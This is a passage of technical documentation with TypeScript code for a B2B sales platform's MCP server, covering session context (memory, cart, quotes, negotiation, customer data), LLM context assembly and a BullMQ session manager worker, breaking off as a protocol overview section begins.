    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    const now = new Date();
    const existingIndex = session.context.memory.findIndex(m => m.key === key);
    
    if (existingIndex >= 0) {
      // Update existing memory
      session.context.memory[existingIndex] = {
        ...session.context.memory[existingIndex],
        value,
        importance: options.importance ?? session.context.memory[existingIndex].importance,
        lastAccessedAt: now,
        accessCount: session.context.memory[existingIndex].accessCount + 1
      };
    } else {
      // Add new memory
      session.context.memory.push({
        key,
        value,
        type: options.type ?? 'fact',
        importance: options.importance ?? 0.5,
        createdAt: now,
        lastAccessedAt: now,
        accessCount: 1
      });
    }
    
    // Decay importance of other memories
    await this.decayMemoryImportance(session.context.memory);
    
    await this.sessionStore.updateContext(sessionId, {
      memory: session.context.memory
    });
    
    logger.debug('Memory stored', { sessionId, key });
  }
  
  /**
   * Recall from memory
   */
  async recall(sessionId: string, key: string): Promise<unknown> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return null;
    
    const memory = session.context.memory.find(m => m.key === key);
    if (!memory) return null;
    
    // Update access tracking
    memory.lastAccessedAt = new Date();
    memory.accessCount++;
    
    await this.sessionStore.updateContext(sessionId, {
      memory: session.context.memory
    });
    
    return memory.value;
  }
  
  /**
   * Search memory by type
   */
  async searchMemory(
    sessionId: string,
    type: string
  ): Promise<MemoryItem[]> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return [];
    
    return session.context.memory
      .filter(m => m.type === type)
      .sort((a, b) => b.importance - a.importance);
  }
  
  /**
   * Forget memory (explicit deletion)
   */
  async forget(sessionId: string, key: string): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    session.context.memory = session.context.memory.filter(m => m.key !== key);
    
    await this.sessionStore.updateContext(sessionId, {
      memory: session.context.memory
    });
  }
  
  /**
   * Add product to context
   */
  async addProduct(
    sessionId: string,
    product: ProductContext
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    // Check if product already exists
    const existing = session.context.products.findIndex(p => p.id === product.id);
    
    if (existing >= 0) {
      session.context.products[existing] = {
        ...session.context.products[existing],
        ...product
      };
    } else {
      session.context.products.push(product);
    }
    
    // Set as current product
    session.context.currentProduct = product.id;
    
    await this.sessionStore.updateContext(sessionId, {
      products: session.context.products,
      currentProduct: product.id
    });
  }
  
  /**
   * Mark product as discussed
   */
  async markProductDiscussed(
    sessionId: string,
    productId: string
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    const product = session.context.products.find(p => p.id === productId);
    if (product) {
      product.discussed = true;
      await this.sessionStore.updateContext(sessionId, {
        products: session.context.products
      });
    }
  }
  
  /**
   * Add to cart
   */
  async addToCart(
    sessionId: string,
    item: {
      productId: string;
      sku: string;
      name: string;
      quantity: number;
      unitPrice: number;
      discount?: number;
    }
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    const now = new Date();
    
    if (!session.context.cart) {
      session.context.cart = {
        items: [],
        subtotal: 0,
        discount: 0,
        total: 0,
        currency: 'RON',
        createdAt: now,
        updatedAt: now
      };
    }
    
    // Check if item already in cart
    const existingIndex = session.context.cart.items.findIndex(
      i => i.productId === item.productId
    );
    
    const discount = item.discount ?? 0;
    const lineTotal = item.quantity * item.unitPrice * (1 - discount / 100);
    
    const cartItem = {
      productId: item.productId,
      sku: item.sku,
      name: item.name,
      quantity: item.quantity,
      unitPrice: item.unitPrice,
      discount,
      lineTotal
    };
    
    if (existingIndex >= 0) {
      session.context.cart.items[existingIndex] = cartItem;
    } else {
      session.context.cart.items.push(cartItem);
    }
    
    // Recalculate totals
    await this.recalculateCart(session.context.cart);
    
    // Mark product as added to cart
    const product = session.context.products.find(p => p.id === item.productId);
    if (product) {
      product.addedToCart = true;
    }
    
    await this.sessionStore.updateContext(sessionId, {
      cart: session.context.cart,
      products: session.context.products
    });
    
    logger.debug('Item added to cart', { 
      sessionId, 
      productId: item.productId, 
      quantity: item.quantity 
    });
  }
  
  /**
   * Remove from cart
   */
  async removeFromCart(
    sessionId: string,
    productId: string
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session?.context.cart) return;
    
    session.context.cart.items = session.context.cart.items.filter(
      i => i.productId !== productId
    );
    
    await this.recalculateCart(session.context.cart);
    
    // Update product status
    const product = session.context.products.find(p => p.id === productId);
    if (product) {
      product.addedToCart = false;
    }
    
    await this.sessionStore.updateContext(sessionId, {
      cart: session.context.cart,
      products: session.context.products
    });
  }
  
  /**
   * Clear cart
   */
  async clearCart(sessionId: string): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    // Reset product cart status
    session.context.products.forEach(p => {
      p.addedToCart = false;
    });
    
    session.context.cart = undefined;
    
    await this.sessionStore.updateContext(sessionId, {
      cart: undefined,
      products: session.context.products
    });
  }
  
  /**
   * Set active quote
   */
  async setActiveQuote(
    sessionId: string,
    quote: {
      quoteId: string;
      items: Array<{
        productId: string;
        quantity: number;
        unitPrice: number;
        discount: number;
        lineTotal: number;
      }>;
      total: number;
      validUntil: Date;
    }
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    session.context.activeQuote = {
      quoteId: quote.quoteId,
      status: 'draft',
      items: quote.items,
      total: quote.total,
      validUntil: quote.validUntil
    };
    
    await this.sessionStore.updateContext(sessionId, {
      activeQuote: session.context.activeQuote
    });
    
    logger.debug('Active quote set', { sessionId, quoteId: quote.quoteId });
  }
  
  /**
   * Update quote status
   */
  async updateQuoteStatus(
    sessionId: string,
    quoteId: string,
    status: 'sent' | 'viewed' | 'accepted' | 'rejected' | 'expired',
    sentAt?: Date
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session?.context.activeQuote) return;
    
    if (session.context.activeQuote.quoteId === quoteId) {
      session.context.activeQuote.status = status;
      if (sentAt) {
        session.context.activeQuote.sentAt = sentAt;
      }
      
      await this.sessionStore.updateContext(sessionId, {
        activeQuote: session.context.activeQuote
      });
    }
  }
  
  /**
   * Add pending action
   */
  async addPendingAction(
    sessionId: string,
    action: {
      type: 'confirm_order' | 'send_quote' | 'reserve_stock' | 'schedule_callback' | 'escalate';
      data: Record<string, unknown>;
      expiresIn?: number; // seconds
    }
  ): Promise<string> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) throw new Error(`Session not found: ${sessionId}`);
    
    const actionId = `action_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
    
    const pendingAction = {
      id: actionId,
      type: action.type,
      data: action.data,
      createdAt: new Date(),
      expiresAt: action.expiresIn 
        ? new Date(Date.now() + action.expiresIn * 1000)
        : undefined
    };
    
    session.context.pendingActions.push(pendingAction);
    
    await this.sessionStore.updateContext(sessionId, {
      pendingActions: session.context.pendingActions
    });
    
    logger.debug('Pending action added', { sessionId, actionId, type: action.type });
    
    return actionId;
  }
  
  /**
   * Remove pending action
   */
  async removePendingAction(
    sessionId: string,
    actionId: string
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    session.context.pendingActions = session.context.pendingActions.filter(
      a => a.id !== actionId
    );
    
    await this.sessionStore.updateContext(sessionId, {
      pendingActions: session.context.pendingActions
    });
  }
  
  /**
   * Get pending actions
   */
  async getPendingActions(
    sessionId: string,
    type?: string
  ): Promise<Array<{ id: string; type: string; data: Record<string, unknown>; createdAt: Date }>> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return [];
    
    const now = Date.now();
    
    // Filter out expired and optionally by type
    return session.context.pendingActions.filter(a => {
      if (a.expiresAt && new Date(a.expiresAt).getTime() < now) return false;
      if (type && a.type !== type) return false;
      return true;
    });
  }
  
  /**
   * Set negotiation context
   */
  async setNegotiation(
    sessionId: string,
    negotiation: {
      negotiationId: string;
      state: string;
      currentOffer?: {
        productId: string;
        quantity: number;
        unitPrice: number;
        discount: number;
      };
    }
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    const existing = session.context.currentNegotiation;
    
    session.context.currentNegotiation = {
      negotiationId: negotiation.negotiationId,
      state: negotiation.state,
      currentOffer: negotiation.currentOffer,
      counterOffers: existing?.negotiationId === negotiation.negotiationId
        ? (existing.counterOffers || 0) + (negotiation.currentOffer ? 1 : 0)
        : 0,
      lastActivity: new Date()
    };
    
    await this.sessionStore.updateContext(sessionId, {
      currentNegotiation: session.context.currentNegotiation
    });
  }
  
  /**
   * Clear negotiation context
   */
  async clearNegotiation(sessionId: string): Promise<void> {
    await this.sessionStore.updateContext(sessionId, {
      currentNegotiation: undefined
    });
  }
  
  /**
   * Set customer context
   */
  async setCustomer(
    sessionId: string,
    customer: {
      id: string;
      cui?: string;
      companyName: string;
      contactName?: string;
      tier: 'bronze' | 'silver' | 'gold';
      segment?: string;
      creditLimit?: number;
      paymentTerms?: number;
      preferences?: Record<string, unknown>;
      history?: {
        totalOrders: number;
        totalRevenue: number;
        lastOrderDate?: Date;
        averageOrderValue: number;
      };
    }
  ): Promise<void> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) return;
    
    session.context.customer = customer;
    
    // Also update session customerId
    await this.sessionStore.updateSession(sessionId, {
      customerId: customer.id,
      context: {
        ...session.context,
        customer
      }
    });
    
    logger.debug('Customer context set', { 
      sessionId, 
      customerId: customer.id, 
      companyName: customer.companyName 
    });
  }
  
  /**
   * Build LLM context from session
   */
  async buildLLMContext(sessionId: string): Promise<string> {
    const session = await this.sessionStore.getSession(sessionId);
    if (!session) throw new Error(`Session not found: ${sessionId}`);
    
    const parts: string[] = [];
    
    // Customer info
    if (session.context.customer) {
      const c = session.context.customer;
      parts.push(`## Customer\n- Company: ${c.companyName}\n- Tier: ${c.tier}${c.cui ? `\n- CUI: ${c.cui}` : ''}${c.contactName ? `\n- Contact: ${c.contactName}` : ''}`);
      
      if (c.history) {
        parts.push(`- Orders: ${c.history.totalOrders}, Revenue: ${c.history.totalRevenue.toLocaleString()} RON`);
      }
    }
    
    // Current topic and intent
    if (session.context.currentIntent || session.context.currentTopic) {
      parts.push(`\n## Current State`);
      if (session.context.currentIntent) parts.push(`- Intent: ${session.context.currentIntent}`);
      if (session.context.currentTopic) parts.push(`- Topic: ${session.context.currentTopic}`);
    }
    
    // Products discussed
    if (session.context.products.length > 0) {
      const discussed = session.context.products.filter(p => p.discussed);
      if (discussed.length > 0) {
        parts.push(`\n## Products Discussed\n${discussed.map(p => 
          `- ${p.name} (${p.sku}): ${p.price.toLocaleString()} RON${p.addedToCart ? ' [In Cart]' : ''}`
        ).join('\n')}`);
      }
    }
    
    // Cart
    if (session.context.cart && session.context.cart.items.length > 0) {
      parts.push(`\n## Shopping Cart\n${session.context.cart.items.map(i => 
        `- ${i.name}: ${i.quantity} x ${i.unitPrice.toLocaleString()} RON = ${i.lineTotal.toLocaleString()} RON`
      ).join('\n')}\nTotal: ${session.context.cart.total.toLocaleString()} RON`);
    }
    
    // Active quote
    if (session.context.activeQuote) {
      const q = session.context.activeQuote;
      parts.push(`\n## Active Quote\n- Quote ID: ${q.quoteId}\n- Status: ${q.status}\n- Total: ${q.total.toLocaleString()} RON\n- Valid until: ${q.validUntil}`);
    }
    
    // Negotiation
    if (session.context.currentNegotiation) {
      const n = session.context.currentNegotiation;
      parts.push(`\n## Active Negotiation\n- State: ${n.state}\n- Counter offers: ${n.counterOffers}`);
    }
    
    // Slots (key parameters)
    const filledSlots = Object.values(session.context.slots).filter(
      s => s.confidence >= SLOT_CONFIDENCE_THRESHOLD
    );
    if (filledSlots.length > 0) {
      parts.push(`\n## Parameters\n${filledSlots.map(s => 
        `- ${s.name}: ${s.value}`
      ).join('\n')}`);
    }
    
    // Relevant memories
    const importantMemories = session.context.memory
      .filter(m => m.importance > 0.6)
      .sort((a, b) => b.importance - a.importance)
      .slice(0, 5);
    
    if (importantMemories.length > 0) {
      parts.push(`\n## Key Facts\n${importantMemories.map(m => 
        `- ${m.key}: ${m.value}`
      ).join('\n')}`);
    }
    
    // Conversation summary if available
    if (session.context.conversationSummary) {
      parts.push(`\n## Previous Context\n${session.context.conversationSummary}`);
    }
    
    return parts.join('\n');
  }
  
  // Private helpers
  
  private async decayMemoryImportance(memory: MemoryItem[]): Promise<void> {
    const now = Date.now();
    const maxAge = MAX_MEMORY_AGE_DAYS * 24 * 60 * 60 * 1000;
    
    memory.forEach(m => {
      const age = now - new Date(m.lastAccessedAt).getTime();
      
      // Remove if too old
      if (age > maxAge) {
        m.importance = 0;
      } else {
        // Decay importance over time
        m.importance *= MEMORY_IMPORTANCE_DECAY;
      }
    });
    
    // Remove zero importance items
    const filtered = memory.filter(m => m.importance > 0.01);
    memory.length = 0;
    memory.push(...filtered);
  }
  
  private async recalculateCart(cart: any): Promise<void> {
    cart.subtotal = cart.items.reduce(
      (sum: number, item: any) => sum + (item.quantity * item.unitPrice),
      0
    );
    
    cart.discount = cart.items.reduce(
      (sum: number, item: any) => sum + (item.quantity * item.unitPrice * item.discount / 100),
      0
    );
    
    cart.total = cart.subtotal - cart.discount;
    cart.updatedAt = new Date();
  }
}

// Export singleton factory
export function createContextManager(sessionStore: SessionStore, redis: Redis): ContextManager {
  return new ContextManager(sessionStore, redis);
}
```

### 4.5 Session Manager Worker

```typescript
// packages/workers/src/etapa3/l-mcp-server/l3-session-manager/worker.ts

import { Queue, Worker, Job, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';
import { logger } from '@cerniq/logger';
import { Counter, Histogram, Gauge } from 'prom-client';
import { 
  MCPSession, 
  SessionContext, 
  SessionStatus,
  SessionCapabilities 
} from './types';
import { SessionStore, getSessionStore } from './session-store';
import { ContextManager, createContextManager } from './context-manager';
import { db } from '@cerniq/database';
import { redisConnection } from '@cerniq/redis';

// Metrics
const sessionDuration = new Histogram({
  name: 'mcp_session_duration_seconds',
  help: 'Duration of MCP sessions',
  labelNames: ['tenant_id', 'channel', 'status'],
  buckets: [60, 300, 600, 1800, 3600, 7200, 14400]
});

const activeSessions = new Gauge({
  name: 'mcp_active_sessions',
  help: 'Number of active MCP sessions',
  labelNames: ['tenant_id', 'channel']
});

const sessionOperations = new Counter({
  name: 'mcp_session_operations_total',
  help: 'Total session operations',
  labelNames: ['tenant_id', 'operation', 'status']
});

const contextUpdates = new Counter({
  name: 'mcp_context_updates_total',
  help: 'Total context updates',
  labelNames: ['tenant_id', 'update_type']
});

// Queue name
const QUEUE_NAME = 'mcp:session:manage';

// Job types
type SessionJobType = 
  | 'create'
  | 'activate'
  | 'update'
  | 'update-context'
  | 'add-message'
  | 'suspend'
  | 'resume'
  | 'terminate'
  | 'expire-check'
  | 'snapshot'
  | 'get'
  | 'list'
  | 'cleanup';

interface SessionJobData {
  type: SessionJobType;
  tenantId: string;
  sessionId?: string;
  payload?: Record<string, unknown>;
  requestId?: string;
}

interface SessionJobResult {
  type: SessionJobType;
  success: boolean;
  data?: Record<string, unknown>;
  session?: MCPSession;
  sessions?: MCPSession[];
  error?: string;
}

/**
 * Session Manager Worker
 */
export class SessionManagerWorker {
  private queue: Queue<SessionJobData, SessionJobResult>;
  private worker: Worker<SessionJobData, SessionJobResult>;
  private queueEvents: QueueEvents;
  private sessionStore: SessionStore;
  private contextManager: ContextManager;
  private redis: Redis;
  private expirationCheckInterval?: NodeJS.Timeout;
  
  constructor() {
    this.redis = redisConnection;
    this.sessionStore = getSessionStore(this.redis, db);
    this.contextManager = createContextManager(this.sessionStore, this.redis);
    
    // Initialize queue
    this.queue = new Queue<SessionJobData, SessionJobResult>(QUEUE_NAME, {
      connection: this.redis,
      defaultJobOptions: {
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 1000
        },
        removeOnComplete: {
          age: 3600,
          count: 1000
        },
        removeOnFail: {
          age: 86400
        }
      }
    });
    
    // Initialize worker
    this.worker = new Worker<SessionJobData, SessionJobResult>(
      QUEUE_NAME,
      async (job) => this.processJob(job),
      {
        connection: this.redis,
        concurrency: 100,
        limiter: {
          max: 1000,
          duration: 1000
        }
      }
    );
    
    // Queue events
    this.queueEvents = new QueueEvents(QUEUE_NAME, { 
      connection: this.redis 
    });
    
    // Setup event handlers
    this.setupEventHandlers();
    
    // Start expiration check
    this.startExpirationCheck();
    
    logger.info('Session Manager Worker initialized');
  }
  
  /**
   * Process job
   */
  private async processJob(
    job: Job<SessionJobData, SessionJobResult>
  ): Promise<SessionJobResult> {
    const { type, tenantId, sessionId, payload, requestId } = job.data;
    const startTime = Date.now();
    
    logger.debug('Processing session job', { 
      jobId: job.id, 
      type, 
      tenantId, 
      sessionId,
      requestId 
    });
    
    try {
      let result: SessionJobResult;
      
      switch (type) {
        case 'create':
          result = await this.handleCreate(tenantId, payload!);
          break;
          
        case 'activate':
          result = await this.handleActivate(sessionId!);
          break;
          
        case 'update':
          result = await this.handleUpdate(sessionId!, payload!);
          break;
          
        case 'update-context':
          result = await this.handleUpdateContext(sessionId!, payload!);
          break;
          
        case 'add-message':
          result = await this.handleAddMessage(sessionId!, payload!);
          break;
          
        case 'suspend':
          result = await this.handleSuspend(sessionId!);
          break;
          
        case 'resume':
          result = await this.handleResume(sessionId!);
          break;
          
        case 'terminate':
          result = await this.handleTerminate(sessionId!, payload?.reason as string);
          break;
          
        case 'expire-check':
          result = await this.handleExpireCheck(tenantId);
          break;
          
        case 'snapshot':
          result = await this.handleSnapshot(sessionId!);
          break;
          
        case 'get':
          result = await this.handleGet(sessionId!);
          break;
          
        case 'list':
          result = await this.handleList(tenantId, payload);
          break;
          
        case 'cleanup':
          result = await this.handleCleanup(tenantId, payload);
          break;
          
        default:
          throw new Error(`Unknown job type: ${type}`);
      }
      
      // Record metrics
      const duration = (Date.now() - startTime) / 1000;
      sessionOperations.inc({ 
        tenant_id: tenantId, 
        operation: type, 
        status: 'success' 
      });
      
      return result;
      
    } catch (error) {
      sessionOperations.inc({ 
        tenant_id: tenantId, 
        operation: type, 
        status: 'error' 
      });
      
      logger.error('Session job failed', {
        jobId: job.id,
        type,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      
      throw error;
    }
  }
  
  /**
   * Handle session creation
   */
  private async handleCreate(
    tenantId: string,
    payload: Record<string, unknown>
  ): Promise<SessionJobResult> {
    const session = await this.sessionStore.createSession({
      tenantId,
      userId: payload.userId as string,
      customerId: payload.customerId as string,
      conversationId: payload.conversationId as string,
      channel: payload.channel as string,
      channelMetadata: payload.channelMetadata as Record<string, unknown>,
      capabilities: payload.capabilities as Partial<SessionCapabilities>,
      ttl: payload.ttl as number
    });
    
    // Update active sessions gauge
    activeSessions.inc({ tenant_id: tenantId, channel: session.channel });
    
    return {
      type: 'create',
      success: true,
      session
    };
  }
  
  /**
   * Handle session activation
   */
  private async handleActivate(sessionId: string): Promise<SessionJobResult> {
    const session = await this.sessionStore.activateSession(sessionId);
    
    if (!session) {
      return {
        type: 'activate',
        success: false,
        error: `Session not found: ${sessionId}`
      };
    }
    
    return {
      type: 'activate',
      success: true,
      session
    };
  }
  
  /**
   * Handle session update
   */
  private async handleUpdate(
    sessionId: string,
    payload: Record<string, unknown>
  ): Promise<SessionJobResult> {
    const session = await this.sessionStore.updateSession(
      sessionId, 
      payload as Partial<MCPSession>
    );
    
    if (!session) {
      return {
        type: 'update',
        success: false,
        error: `Session not found: ${sessionId}`
      };
    }
    
    return {
      type: 'update',
      success: true,
      session
    };
  }
  
  /**
   * Handle context update
   */
  private async handleUpdateContext(
    sessionId: string,
    payload: Record<string, unknown>
  ): Promise<SessionJobResult> {
    const { updateType, ...data } = payload;
    
    try {
      switch (updateType) {
        case 'intent':
          await this.contextManager.setIntent(
            sessionId, 
            data.intent as string,
            data.confidence as number
          );
          break;
          
        case 'topic':
          await this.contextManager.setTopic(sessionId, data.topic as string);
          break;
          
        case 'slot':
          await this.contextManager.setSlot(
            sessionId,
            data.name as string,
            data.value,
            data.options as any
          );
          break;
          
        case 'variable':
          await this.contextManager.setVariable(
            sessionId,
            data.key as string,
            data.value
          );
          break;
          
        case 'memory':
          await this.contextManager.remember(
            sessionId,
            data.key as string,
            data.value,
            data.options as any
          );
          break;
          
        case 'product':
          await this.contextManager.addProduct(sessionId, data.product as any);
          break;
          
        case 'cart-add':
          await this.contextManager.addToCart(sessionId, data.item as any);
          break;
          
        case 'cart-remove':
          await this.contextManager.removeFromCart(
            sessionId, 
            data.productId as string
          );
          break;
          
        case 'cart-clear':
          await this.contextManager.clearCart(sessionId);
          break;
          
        case 'quote':
          await this.contextManager.setActiveQuote(sessionId, data.quote as any);
          break;
          
        case 'quote-status':
          await this.contextManager.updateQuoteStatus(
            sessionId,
            data.quoteId as string,
            data.status as any,
            data.sentAt as Date
          );
          break;
          
        case 'negotiation':
          await this.contextManager.setNegotiation(
            sessionId, 
            data.negotiation as any
          );
          break;
          
        case 'customer':
          await this.contextManager.setCustomer(sessionId, data.customer as any);
          break;
          
        case 'pending-action':
          const actionId = await this.contextManager.addPendingAction(
            sessionId, 
            data.action as any
          );
          return {
            type: 'update-context',
            success: true,
            data: { actionId }
          };
          
        default:
          throw new Error(`Unknown update type: ${updateType}`);
      }
      
      // Record metrics
      const session = await this.sessionStore.getSession(sessionId);
      if (session) {
        contextUpdates.inc({ 
          tenant_id: session.tenantId, 
          update_type: updateType as string 
        });
      }
      
      return {
        type: 'update-context',
        success: true
      };
      
    } catch (error) {
      return {
        type: 'update-context',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }
  
  /**
   * Handle message addition
   */
  private async handleAddMessage(
    sessionId: string,
    payload: Record<string, unknown>
  ): Promise<SessionJobResult> {
    try {
      await this.sessionStore.addMessage(sessionId, {
        role: payload.role as 'user' | 'assistant' | 'system',
        content: payload.content as string,
        metadata: payload.metadata as Record<string, unknown>
      });
      
      return {
        type: 'add-message',
        success: true
      };
    } catch (error) {
      return {
        type: 'add-message',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }
  
  /**
   * Handle session suspension
   */
  private async handleSuspend(sessionId: string): Promise<SessionJobResult> {
    const session = await this.sessionStore.suspendSession(sessionId);
    
    if (!session) {
      return {
        type: 'suspend',
        success: false,
        error: `Session not found: ${sessionId}`
      };
    }
    
    // Update gauge
    activeSessions.dec({ tenant_id: session.tenantId, channel: session.channel });
    
    return {
      type: 'suspend',
      success: true,
      session
    };
  }
  
  /**
   * Handle session resumption
   */
  private async handleResume(sessionId: string): Promise<SessionJobResult> {
    const session = await this.sessionStore.resumeSession(sessionId);
    
    if (!session) {
      return {
        type: 'resume',
        success: false,
        error: `Session not found or not suspended: ${sessionId}`
      };
    }
    
    // Update gauge
    activeSessions.inc({ tenant_id: session.tenantId, channel: session.channel });
    
    return {
      type: 'resume',
      success: true,
      session
    };
  }
  
  /**
   * Handle session termination
   */
  private async handleTerminate(
    sessionId: string,
    reason?: string
  ): Promise<SessionJobResult> {
    const session = await this.sessionStore.getSession(sessionId);
    
    if (!session) {
      return {
        type: 'terminate',
        success: false,
        error: `Session not found: ${sessionId}`
      };
    }
    
    // Record session duration
    const duration = (Date.now() - new Date(session.createdAt).getTime()) / 1000;
    sessionDuration.observe(
      { 
        tenant_id: session.tenantId, 
        channel: session.channel,
        status: 'terminated'
      }, 
      duration
    );
    
    await this.sessionStore.terminateSession(sessionId, reason);
    
    // Update gauge
    activeSessions.dec({ tenant_id: session.tenantId, channel: session.channel });
    
    return {
      type: 'terminate',
      success: true,
      data: { duration, reason }
    };
  }
  
  /**
   * Handle expiration check for tenant
   */
  private async handleExpireCheck(tenantId: string): Promise<SessionJobResult> {
    const sessions = await this.sessionStore.getTenantSessions(tenantId, {
      status: 'active'
    });
    
    let expiredCount = 0;
    
    for (const session of sessions) {
      if (new Date(session.expiresAt) < new Date()) {
        // Record duration
        const duration = (Date.now() - new Date(session.createdAt).getTime()) / 1000;
        sessionDuration.observe(
          { 
            tenant_id: session.tenantId, 
            channel: session.channel,
            status: 'expired'
          }, 
          duration
        );
        
        await this.sessionStore.expireSession(session.sessionId);
        activeSessions.dec({ tenant_id: session.tenantId, channel: session.channel });
        expiredCount++;
      }
    }
    
    if (expiredCount > 0) {
      logger.info('Sessions expired', { tenantId, count: expiredCount });
    }
    
    return {
      type: 'expire-check',
      success: true,
      data: { expiredCount }
    };
  }
  
  /**
   * Handle context snapshot
   */
  private async handleSnapshot(sessionId: string): Promise<SessionJobResult> {
    const session = await this.sessionStore.getSession(sessionId);
    
    if (!session) {
      return {
        type: 'snapshot',
        success: false,
        error: `Session not found: ${sessionId}`
      };
    }
    
    // Build LLM context
    const llmContext = await this.contextManager.buildLLMContext(sessionId);
    
    return {
      type: 'snapshot',
      success: true,
      data: {
        context: session.context,
        llmContext,
        stats: session.stats
      }
    };
  }
  
  /**
   * Handle get session
   */
  private async handleGet(sessionId: string): Promise<SessionJobResult> {
    const session = await this.sessionStore.getSession(sessionId);
    
    if (!session) {
      return {
        type: 'get',
        success: false,
        error: `Session not found: ${sessionId}`
      };
    }
    
    return {
      type: 'get',
      success: true,
      session
    };
  }
  
  /**
   * Handle list sessions
   */
  private async handleList(
    tenantId: string,
    payload?: Record<string, unknown>
  ): Promise<SessionJobResult> {
    const sessions = await this.sessionStore.getTenantSessions(tenantId, {
      status: payload?.status as SessionStatus,
      channel: payload?.channel as string,
      limit: payload?.limit as number
    });
    
    return {
      type: 'list',
      success: true,
      sessions,
      data: { count: sessions.length }
    };
  }
  
  /**
   * Handle cleanup old sessions
   */
  private async handleCleanup(
    tenantId: string,
    payload?: Record<string, unknown>
  ): Promise<SessionJobResult> {
    const maxAge = (payload?.maxAgeDays as number) || 7;
    const cutoff = new Date(Date.now() - maxAge * 24 * 60 * 60 * 1000);
    
    // Query database for old sessions
    const oldSessions = await db
      .select({ sessionId: schema.mcpSessions.sessionId })
      .from(schema.mcpSessions)
      .where(and(
        eq(schema.mcpSessions.tenantId, tenantId),
        lt(schema.mcpSessions.lastActivityAt, cutoff),
        or(
          eq(schema.mcpSessions.status, 'expired'),
          eq(schema.mcpSessions.status, 'terminated')
        )
      ))
      .limit(1000);
    
    // Delete from database
    for (const s of oldSessions) {
      await db
        .delete(schema.mcpSessions)
        .where(eq(schema.mcpSessions.sessionId, s.sessionId));
        
      // Also delete snapshots
      await db
        .delete(schema.mcpSessionSnapshots)
        .where(eq(schema.mcpSessionSnapshots.sessionId, s.sessionId));
    }
    
    logger.info('Sessions cleaned up', { 
      tenantId, 
      count: oldSessions.length,
      cutoff 
    });
    
    return {
      type: 'cleanup',
      success: true,
      data: { cleanedCount: oldSessions.length }
    };
  }
  
  /**
   * Setup event handlers
   */
  private setupEventHandlers(): void {
    this.worker.on('completed', (job, result) => {
      logger.debug('Session job completed', {
        jobId: job.id,
        type: job.data.type,
        success: result.success
      });
    });
    
    this.worker.on('failed', (job, error) => {
      logger.error('Session job failed', {
        jobId: job?.id,
        type: job?.data.type,
        error: error.message
      });
    });
    
    this.worker.on('error', (error) => {
      logger.error('Worker error', { error: error.message });
    });
    
    this.worker.on('stalled', (jobId) => {
      logger.warn('Job stalled', { jobId });
    });
  }
  
  /**
   * Start periodic expiration check
   */
  private startExpirationCheck(): void {
    // Check every 5 minutes
    this.expirationCheckInterval = setInterval(async () => {
      try {
        // Get all tenants with active sessions
        const tenantKeys = await this.redis.keys('mcp:session:index:tenant:*');
        
        for (const key of tenantKeys) {
          const tenantId = key.split(':').pop()!;
          await this.addJob({
            type: 'expire-check',
            tenantId
          });
        }
      } catch (error) {
        logger.error('Expiration check failed', { 
          error: error instanceof Error ? error.message : 'Unknown error' 
        });
      }
    }, 5 * 60 * 1000);
  }
  
  /**
   * Add job to queue
   */
  async addJob(
    data: SessionJobData,
    options?: { priority?: number; delay?: number }
  ): Promise<Job<SessionJobData, SessionJobResult>> {
    return this.queue.add(data.type, data, {
      priority: options?.priority || 2,
      delay: options?.delay
    });
  }
  
  /**
   * Create session (convenience method)
   */
  async createSession(params: {
    tenantId: string;
    userId?: string;
    customerId?: string;
    conversationId?: string;
    channel: string;
    channelMetadata?: Record<string, unknown>;
    capabilities?: Partial<SessionCapabilities>;
    ttl?: number;
  }): Promise<MCPSession> {
    const job = await this.addJob({
      type: 'create',
      tenantId: params.tenantId,
      payload: params
    });
    
    const result = await job.waitUntilFinished(this.queueEvents, 30000);
    
    if (!result.success || !result.session) {
      throw new Error(result.error || 'Failed to create session');
    }
    
    return result.session;
  }
  
  /**
   * Get session (convenience method)
   */
  async getSession(sessionId: string): Promise<MCPSession | null> {
    return this.sessionStore.getSession(sessionId);
  }
  
  /**
   * Build LLM context (convenience method)
   */
  async buildLLMContext(sessionId: string): Promise<string> {
    return this.contextManager.buildLLMContext(sessionId);
  }
  
  /**
   * Get context manager (for direct access)
   */
  getContextManager(): ContextManager {
    return this.contextManager;
  }
  
  /**
   * Graceful shutdown
   */
  async shutdown(): Promise<void> {
    logger.info('Shutting down Session Manager Worker...');
    
    if (this.expirationCheckInterval) {
      clearInterval(this.expirationCheckInterval);
    }
    
    await this.worker.close();
    await this.queue.close();
    await this.queueEvents.close();
    
    logger.info('Session Manager Worker shut down');
  }
}

// Worker instance
export const sessionManagerWorker = new SessionManagerWorker();
```

---

## 5. MCP Protocol Implementation

### 5.1 Protocol Overview

The Model Context Protocol (MCP) implementation provides a standardized interface for AI agents to interact with Cerniq's B2B sales platform. This section details the protocol compliance, message handling, and transport layer implementation.

**MCP Protocol Version:** 1.0
**Transport:** JSON-RPC 2.0 over WebSocket/HTTP

```typescript
// packages/workers/src/etapa3/l-mcp-server/protocol/types.ts

/**
 * MCP Protocol Constants
 */
export const MCP_PROTOCOL_VERSION = '1.0';
export const MCP_JSONRPC_VERSION = '2.0';

/**
 * JSON-RPC Request
 */
export interface JsonRpcRequest {
